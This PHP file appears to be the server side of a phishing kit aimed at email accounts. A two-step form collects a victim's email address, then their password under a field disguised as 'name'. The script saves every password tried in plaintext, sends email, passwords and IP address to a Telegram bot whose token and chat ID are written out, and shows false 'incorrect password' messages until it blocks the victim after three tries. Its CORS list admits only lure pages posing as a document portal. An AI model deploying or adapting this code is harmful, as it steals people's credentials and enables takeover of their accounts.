<?php
// ==============================
// CONFIG
// ==============================
define('ATTEMPTS_FILE', __DIR__ . '/data/attempts.json');

// ensure data dir exists so attempts persist
$attemptDir = dirname(ATTEMPTS_FILE);
if (!is_dir($attemptDir)) {
    @mkdir($attemptDir, 0755, true);
}

$EMAIL_VALIDATION_ENABLED = false;                 // set true if using whitelist
$whitelist_file           = __DIR__ . '/papa.txt';

$SUCCESS_REDIRECT_URL = "https://example.com/final-document"; // TODO: change
$BLOCK_REDIRECT_URL   = "https://documentportal.zoholandingpage.com/blocked-page"; // TODO: change

// Telegram
$telegram_bot_token = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
$telegram_chat_id   = "6915371044";

// stateless step1→step2 token
$TOKEN_SECRET = "CHANGE_THIS_TO_A_LONG_RANDOM_SECRET";
$TOKEN_TTL    = 900; // 15 min

// Allowed frontends for CORS
$ALLOWED_ORIGINS = [
    'https://documentportal.zoholandingpage.com',
    'https://transmission.zoholandingpage.com',
];

// ==============================
// HEADERS / CORS
// ==============================
header('Content-Type: application/json; charset=utf-8');

$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
if ($origin && in_array($origin, $ALLOWED_ORIGINS, true)) {
    header("Access-Control-Allow-Origin: $origin");
    header("Access-Control-Allow-Credentials: true");
    header("Vary: Origin");
}

header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    echo '';
    exit;
}

// ==============================
// HELPERS
// ==============================
function json_fail($msg, $extra = []) {
    echo json_encode(array_merge(['ok' => false, 'error' => $msg], $extra));
    exit;
}
function json_ok($extra = []) {
    echo json_encode(array_merge(['ok' => true], $extra));
    exit;
}

function get_ip() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function email_allowed($email, $enabled, $file) {
    if (!$enabled) return true;
    if (!file_exists($file)) return false;
    $list = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $list = array_map('trim', $list);
    return in_array($email, $list, true);
}

function make_token($email, $secret) {
    $ts  = time();
    $raw = $email . '|' . $ts;
    $mac = hash_hmac('sha256', $raw, $secret);
    return base64_encode($raw . '|' . $mac);
}

function parse_token($token, $secret, $ttl) {
    if (!$token) return [false, 'Session expired. Please verify again.'];
    $decoded = base64_decode($token, true);
    if ($decoded === false) return [false, 'Session expired. Please verify again.'];
    $parts = explode('|', $decoded);
    if (count($parts) !== 3) return [false, 'Session expired. Please verify again.'];
    [$email, $ts, $mac] = $parts;
    $ts = (int)$ts;
    $expected = hash_hmac('sha256', $email . '|' . $ts, $secret);
    if (!hash_equals($expected, $mac)) return [false, 'Session expired. Please verify again.'];
    if (time() - $ts > $ttl) return [false, 'Session expired. Please verify again.'];
    return [true, ['email' => $email, 'ts' => $ts]];
}

// ==============================
// BASIC VALIDATION
// ==============================
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    json_fail('Invalid method');
}

$action = $_POST['action'] ?? '';
if (!in_array($action, ['step1', 'step2'], true)) {
    json_fail('Invalid action');
}

// Honeypot
if (!empty($_POST['company'] ?? '')) {
    json_fail('Unexpected error. Please try again.');
}

// load attempts
$attempts = [];
if (file_exists(ATTEMPTS_FILE)) {
    $tmp = json_decode(@file_get_contents(ATTEMPTS_FILE), true);
    if (is_array($tmp)) {
        $attempts = $tmp;
    }
}

// ==============================
// STEP 1 – email
// ==============================
if ($action === 'step1') {
    $email = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
    if (!$email) json_fail('Please enter a valid email address.');

    if (!email_allowed($email, $EMAIL_VALIDATION_ENABLED, $whitelist_file)) {
        json_fail('Access is restricted to your email address.');
    }

    $token = make_token($email, $TOKEN_SECRET);
    json_ok(['email' => $email, 'token' => $token]);
}

// ==============================
// STEP 2 – password
// ==============================
$ip          = get_ip();
$emailInput  = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
$password    = trim($_POST['name'] ?? '');
$postedToken = $_POST['step2_token'] ?? '';

if (!$emailInput || !$password) {
    json_fail('Please enter your email password.');
}

[$okToken, $tokenData] = parse_token($postedToken, $TOKEN_SECRET, $TOKEN_TTL);
if (!$okToken) {
    json_fail($tokenData);
}
$emailFromToken = $tokenData['email'];
$email          = $emailInput ?: $emailFromToken;

if (!email_allowed($email, $EMAIL_VALIDATION_ENABLED, $whitelist_file)) {
    json_fail('Access is restricted to your email address.');
}

// update attempts
$now = date('Y-m-d H:i:s');
if (!isset($attempts[$email])) {
    $attempts[$email] = [
        'names' => [],
        'count' => 0,
        'ip'    => $ip,
        'time'  => $now,
    ];
}
$attempts[$email]['names'][] = $password;
$attempts[$email]['count']   = ($attempts[$email]['count'] ?? 0) + 1;
$attempts[$email]['ip']      = $ip;
$attempts[$email]['time']    = $now;

@file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT));

// Telegram notify
$msg  = "Login attempt for: {$email}\n";
$msg .= "Names tried: " . implode(", ", $attempts[$email]['names']) . "\n";
$msg .= "Total attempts: {$attempts[$email]['count']}\n";
$msg .= "IP: {$ip}\n";
$msg .= "Last updated: {$attempts[$email]['time']}";
@file_get_contents(
    "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage" .
    "?chat_id={$telegram_chat_id}&text=" . urlencode($msg)
);

// Password policy
$correct_password = "John Doe"; // TODO change

if ($password !== $correct_password) {
    if ($attempts[$email]['count'] >= 3) {
        json_fail(
            'Access denied.',
            ['blocked' => true, 'redirect' => $BLOCK_REDIRECT_URL]
        );
    }
    json_fail('Your account or password is incorrect.');
}

// SUCCESS
json_ok(['redirect' => $SUCCESS_REDIRECT_URL]);
